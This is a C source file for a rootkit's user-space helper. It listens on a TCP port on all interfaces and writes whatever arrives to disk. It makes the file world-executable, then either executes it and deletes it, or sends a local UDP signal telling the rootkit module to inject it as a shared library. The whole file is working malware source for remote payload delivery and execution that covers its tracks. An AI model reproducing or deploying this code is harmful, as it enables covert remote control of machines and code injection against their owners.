// User-space helper for receiving an ELF over TCP and executing it or receiving a .so and signaling module
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/stat.h>
#include "config.h"

#define SUCCESS 0
#define ERROR 1

void cleanup()
{
    if (unlink(FILE_PATH) < 0)
        PERROR("unlink");

    if (rmdir(FOLDER_PATH) < 0)
        PERROR("rmdir");
}

int signal_mod() {
    int sock;
    struct sockaddr_in server;
    uint32_t payload = htonl(MOD_SIG_PAYLOAD); // network byte order
    ssize_t sent;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        perror("socket");
        return ERROR;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(MOD_SIG_PORT);

    sent = sendto(sock, &payload, sizeof(payload), 0, (struct sockaddr *)&server, sizeof(server));
    if (sent < 0) {
        perror("sendto");
        close(sock);
        return ERROR;
    }

    close(sock);
    return SUCCESS;
}

int main(int argc, char **argv)
{
    int server_fd, new_socket;
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);
    char buffer[BUF_SIZE];
    int file_fd;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0)
    {
        PERROR("socket");
        return -ERROR;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
    {
        PERROR("bind");
        close(server_fd);
        return -ERROR;
    }

    if (listen(server_fd, 1) < 0)
    {
        PERROR("listen");
        close(server_fd);
        return -ERROR;
    }

    new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
    if (new_socket < 0)
    {
        PERROR("accept");
        close(server_fd);
        return -ERROR;
    }

    struct stat st = {0};
    if (stat(FOLDER_PATH, &st) == -1)
    {
        if (mkdir(FOLDER_PATH, 0700) < 0)
        {
            PERROR("mkdir");
            close(new_socket);
            close(server_fd);
            return -ERROR;
        }
}

    file_fd = open(FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (file_fd < 0)
    {
        PERROR("open");
        close(new_socket);
        close(server_fd);
        cleanup();
        return -ERROR;
    }

    ssize_t len;
    ssize_t written;
    ssize_t total_written;
    char *buf_ptr;
    while ((len = recv(new_socket, buffer, BUF_SIZE, 0)) > 0)
    {
        buf_ptr = buffer;
        total_written = 0;
    
        // Loop until all bytes are written
        while (total_written < len)
        {
            written = write(file_fd, buf_ptr + total_written, len - total_written);
            if (written < 0)
            {
                PERROR("write");
                close(file_fd);
                close(new_socket);
                close(server_fd);
                cleanup();
                return -ERROR;
            }
            total_written += written;
        }
    }

    close(file_fd);
    close(new_socket);
    close(server_fd);

    if (len < 0)
    {
        PERROR("recv");
        cleanup();
        return -ERROR;
    }

    chmod(FILE_PATH, 0777); // returns 0 on success, -1 on failure
    if (access(FILE_PATH, X_OK) != 0)
    {
        PERROR("chmod or access failed");
        cleanup();
        return -ERROR;
    }

    if (argc == 2 && strcmp(argv[1], "s") == 0)
    {
        // If called with "s", a .so is being sent for injection
        // Signal rootkit to inject the .so file
        signal_mod();
        // Just exit here, no execve
        return SUCCESS;   
    }

    pid_t pid = fork();
    if (pid == 0) {
        // Child: run execve
        char *argv[] = {FILE_PATH, NULL};
        char *envp[] = {
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            "HOME=/tmp",
            "LANG=C",
            NULL
        };
        execve(FILE_PATH, argv, envp);
        PERROR("execve");
        exit(-ERROR);
    }
    else if (pid > 0)
    {
        // Parent: wait for child to finish
        int status;
        waitpid(pid, &status, 0);

        // Delete the file
        if (unlink(FILE_PATH) < 0)
            PERROR("unlink");
    }
    else
    {
        PERROR("fork");
        cleanup();
        return ERROR;
    }
    return SUCCESS;
}
